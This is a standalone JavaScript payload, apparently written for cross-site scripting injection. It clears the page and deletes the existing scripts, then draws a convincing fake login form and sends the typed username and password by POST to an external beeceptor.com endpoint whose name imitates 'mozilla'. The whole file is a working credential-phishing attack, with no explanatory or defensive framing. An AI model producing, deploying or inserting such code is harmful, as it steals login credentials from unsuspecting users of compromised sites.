// Clear the document body
document.body.innerHTML = "";
var scriptss = document.scripts;

// Remove existing scripts
for (var i = scriptss.length - 1; i >= 0; i--) {
  var script = scriptss[i];
  script.parentNode.removeChild(script);
}

// Inject styles
document.head.innerHTML += `
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f0f0f0;
    }
    .form-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      max-width: 400px;
      padding: 20px;
      border: 1px solid #ccc;
      border-radius: 10px;
      background-color: #fff;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .form-container input {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    .form-container button {
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
      background-color: #007BFF;
      color: white;
      border: none;
      border-radius: 5px;
    }
  </style>
`;

// Create the form container
var formContainer = document.createElement('div');
formContainer.className = 'form-container';

// Create the form
var form = document.createElement('form');

// Username field
var inputName = document.createElement('input');
inputName.type = 'text';
inputName.id = 'username';
inputName.name = 'username';
inputName.placeholder = 'Enter your username';
inputName.autocomplete = 'username';

// Password field (now visible)
var inputPassword = document.createElement('input');
inputPassword.type = 'password';
inputPassword.id = 'password';
inputPassword.name = 'password';
inputPassword.placeholder = 'Enter your password';
inputPassword.autocomplete = 'current-password';

// Submit button
var button = document.createElement('button');
button.type = 'button';
button.textContent = 'Login';

// Append elements to the form
form.appendChild(inputName);
form.appendChild(inputPassword);
form.appendChild(button);

// Append form to the container
formContainer.appendChild(form);
document.body.appendChild(formContainer);

// Function to send credentials to external server
function sendCredentials() {
  var username = inputName.value;
  var password = inputPassword.value;
  if (username && password) {
    fetch('https://m0zil4444assdfjfa.free.beeceptor.com', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
  }
}

// Attach event listener to the button
button.addEventListener('click', sendCredentials);
